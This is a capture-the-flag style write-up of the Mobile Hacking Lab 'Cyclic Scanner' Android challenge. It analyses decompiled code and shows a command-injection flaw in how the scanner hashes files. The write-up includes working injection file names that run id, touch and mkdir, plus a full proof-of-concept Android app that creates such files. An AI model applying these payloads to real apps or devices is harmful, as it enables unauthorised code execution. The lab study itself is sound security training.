---
title: Cyclic Scanner - Mobile Hacking Lab
date: 2025-1-10 00:00:00 +/-TTTT
categories: [Mobile Hacking Lab]
tags: [mobile hacking lab, writeup, mobile penetration testing, android]     # TAG names should always be lowercase

---





<br />

### Introduction

Welcome to the Cyclic Scanner Challenge! This lab is designed to mimic real-world scenarios where vulnerabilities within Android services lead to exploitable situations. Participants will have the opportunity to exploit these vulnerabilities to achieve remote code execution (RCE) on an Android device.

<br />

### Objective

Exploit a vulnerability inherent within an Android virus scanner Service to achieve remote code execution (RCE).

<br />





When I launched the application, it displayed a simple interface with a single toggle labeled **“Enable Scanner.”** Activating the toggle starts the scanning service, which cannot be stopped. As the app provides no additional user interaction, I proceeded to analyze the source code for further insights.

<br />

![](/assets/img/mhl/CyclicScanner/1.png)

<br />



<br /><br />

**Analyzing the application using JADX**

From: AndroidManifest.xml

```xml
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
<uses-permission android:name="android.permission.INTERNET"/>
<activity
        android:name="com.mobilehackinglab.cyclicscanner.MainActivity"
        android:exported="true">
        <intent-filter>
            <action android:name="android.intent.action.MAIN"/>
            <category android:name="android.intent.category.LAUNCHER"/>
        </intent-filter>
</activity>
<service
    android:name="com.mobilehackinglab.cyclicscanner.scanner.ScanService"
    android:exported="false"/>
```





<br />

From: com.mobilehackinglab.cyclicscanner.MainActivity

```java
public static final void setupSwitch$lambda$3(MainActivity this$0, CompoundButton compoundButton, boolean isChecked) {
    Intrinsics.checkNotNullParameter(this$0, "this$0");
    if (isChecked) {
        Toast.makeText(this$0, "Scan service started, your device will be scanned regularly.", 0).show();
        this$0.startForegroundService(new Intent(this$0, (Class<?>) ScanService.class));
        return;
    }
    Toast.makeText(this$0, "Scan service cannot be stopped, this is for your own safety!", 0).show();
    ActivityMainBinding activityMainBinding = this$0.binding;
    if (activityMainBinding == null) {
        Intrinsics.throwUninitializedPropertyAccessException("binding");
        activityMainBinding = null;
    }
    activityMainBinding.serviceSwitch.setChecked(true);
}

private final void startService() {
    Toast.makeText(this, "Scan service started", 0).show();
    startForegroundService(new Intent(this, (Class<?>) ScanService.class));
}

```

The **setupSwitch$lambda$3()** method is a callback function that controls the app's toggle switch behavior, managing whether the **ScanService** should be started or not.

If the **isChecked** parameter is **true** (indicating the switch is toggled on), a toast message notifies the user that the scan service has started, and the **ScanService** class is launched in the foreground using **startForegroundService()**.

However, if the switch is toggled off (**isChecked** is **false**), the app displays a message stating that the scan service cannot be stopped for **"safety reasons."** It then programmatically re-enables the switch by calling:

```java
activityMainBinding.serviceSwitch.setChecked(true);
```

This prevents users from disabling the scanning service manually.

Additionally, the **startService()** method provides another way to initiate the scan service, showing a toast message before starting the service using **startForegroundService()**.

<br />

When the switch is turned on, a message notifies the user that the scan service has started, and the **ScanService** class is initiated in the foreground. Interestingly, attempting to disable the service is not possible, allegedly due to **"safety reasons."**

<br /><br />





From: com.mobilehackinglab.cyclicscanner.scanner.ScanService

```java
public void handleMessage(Message msg) {
        Intrinsics.checkNotNullParameter(msg, "msg");
        try {
            System.out.println((Object) "starting file scan...");
            File externalStorageDirectory = Environment.getExternalStorageDirectory();
            Intrinsics.checkNotNullExpressionValue(externalStorageDirectory, "getExternalStorageDirectory(...)");
            Sequence $this$forEach$iv = FilesKt.walk$default(externalStorageDirectory, null, 1, null);
            for (Object element$iv : $this$forEach$iv) {
                File file = (File) element$iv;
                if (file.canRead() && file.isFile()) {
                    System.out.print((Object) (file.getAbsolutePath() + "..."));
                    boolean safe = ScanEngine.INSTANCE.scanFile(file);
                    System.out.println((Object) (safe ? "SAFE" : "INFECTED"));
                }
            }
            System.out.println((Object) "finished file scan!");
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        Message $this$handleMessage_u24lambda_u241 = obtainMessage();
        $this$handleMessage_u24lambda_u241.arg1 = msg.arg1;
        sendMessageDelayed($this$handleMessage_u24lambda_u241, ScanService.SCAN_INTERVAL);
    }
}

public int onStartCommand(Intent intent, int flags, int startId) {
    Message message;
    Intrinsics.checkNotNullParameter(intent, "intent");
    Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("Cyclic Scanner Service").setContentText("Scanner is running...").build();
    Intrinsics.checkNotNullExpressionValue(notification, "build(...)");
    startForeground(1, notification);
    ServiceHandler serviceHandler = this.serviceHandler;
    if (serviceHandler != null && (message = serviceHandler.obtainMessage()) != null) {
        message.arg1 = startId;
        ServiceHandler serviceHandler2 = this.serviceHandler;
        if (serviceHandler2 != null) {
            serviceHandler2.sendMessage(message);
        }
    }
    return 1;
}

```

The **ScanService** class defines the app's core functionality by managing the file scanning process. Inside this class, the **ServiceHandler** is responsible for executing the file scans. When **handleMessage()** is called, the app iterates through the external storage directory, passing each file to **ScanEngine.INSTANCE.scanFile()** to determine if it is infected.



<br /><br />

From: com.mobilehackinglab.cyclicscanner.scanner.ScanEngine

```java
public final boolean scanFile(File file) {
    Intrinsics.checkNotNullParameter(file, "file");
    try {
        String command = "toybox sha1sum " + file.getAbsolutePath();
        Process process = new ProcessBuilder(new String[0]).command("sh", "-c", command).directory(Environment.getExternalStorageDirectory()).redirectErrorStream(true).start();
        InputStream inputStream = process.getInputStream();
        Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");
        Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
        BufferedReader bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
        try {
            BufferedReader reader = bufferedReader;
            String output = reader.readLine();
            Intrinsics.checkNotNull(output);
            Object fileHash = StringsKt.substringBefore$default(output, "  ", (String) null, 2, (Object) null);
            Unit unit = Unit.INSTANCE;
            CloseableKt.closeFinally(bufferedReader, null);
            return !ScanEngine.KNOWN_MALWARE_SAMPLES.containsValue(fileHash);
        } finally {
        }
    } catch (Exception e) {
        e.printStackTrace();
        return false;
    }
}
```

**SHA-1 Hash Calculation:** The method constructs a shell command using **`toybox sha1sum`** to calculate the **SHA-1 hash** of the file.

**Command Execution:** The app uses **`ProcessBuilder`** to execute the shell command

The method executes shell commands without proper sanitization. This could lead to **Command Injection**.

For example, if the file name contains a malicious payload like:

```bash
file; id > /sdcard/output.txt
```



<br /><br />



Use `adb` to create a file in the device’s external storage.

```bash
emu64x:/sdcard/Download # echo "test" > test.txt
```

![](/assets/img/mhl/CyclicScanner/3.png)



<br /><br />



 the app’s scanning service will detect and scan the file 

```bash
adb shell pidof -s com.mobilehackinglab.cyclicscanner
adb logcat --pid=2458
```



<br />

![](/assets/img/mhl/CyclicScanner/4.png)





<br />



the executed command is like this

<br />

![](/assets/img/mhl/CyclicScanner/8.png)

<br /><br />



we’ll craft a file with a malicious name that includes a command injection payload.

```bash
emu64x:/sdcard/Download # echo "test" > test2.txt
emu64x:/sdcard/Download # mv test2.txt "test2.txt;touch hacked.txt;id>hacked.txt"

emu64x:/sdcard/Download # ls
test.txt  test2.txt;touch\ hacked.txt;id>hacked.txt
```

<br /><br />

![](/assets/img/mhl/CyclicScanner/11.png)

<br />

<br />

![](/assets/img/mhl/CyclicScanner/9.png)

<br /><br /><br />



![](/assets/img/mhl/CyclicScanner/10.png)

<br />

**Android app PoC**



```xml
<!-- For Android 11 (API 30+) -->
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />

<queries>
    <package android:name="com.mobilehackinglab.cyclicscanner" />
</queries>
```

<br />

```java
public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 1;
    private boolean checkPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return Environment.isExternalStorageManager();
        }
        return false;
    }

    private void requestPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                Toast.makeText(this, "Permission already granted", Toast.LENGTH_SHORT).show();
            } else {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, PERMISSION_REQUEST_CODE);
                } catch (Exception e) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivity(intent);
                }
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                createPoCFile();
            } else {
                Toast.makeText(getApplicationContext(), "Permission Denied!", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void createPoCFile() {
        // your payload here:
        String fileName = "testPoC.txt; mkdir PoC; cd PoC; touch PoCFile.txt";

        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),fileName);

        try {
            boolean created = file.createNewFile();
            if (created) {
                Toast.makeText(getApplicationContext(), "File created: " + file.getAbsolutePath(), Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(getApplicationContext(), "File already exists: " + file.getAbsolutePath(), Toast.LENGTH_LONG).show();
            }
        } catch (IOException e) {
            e.printStackTrace();
            Toast.makeText(getApplicationContext(), "Failed to create file!", Toast.LENGTH_SHORT).show();
        }
    }


    
        @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        
        if (checkPermission()) {
            createPoCFile();
        } else {
            requestPermission();
        }
    }
}
```

1. run the app
2. approve to access the external storage

<br /><br /><br />

![](/assets/img/mhl/CyclicScanner/12.png)

<br /><br /><br />



![](/assets/img/mhl/CyclicScanner/13.png)

<br /><br /><br />

![](/assets/img/mhl/CyclicScanner/14.png)
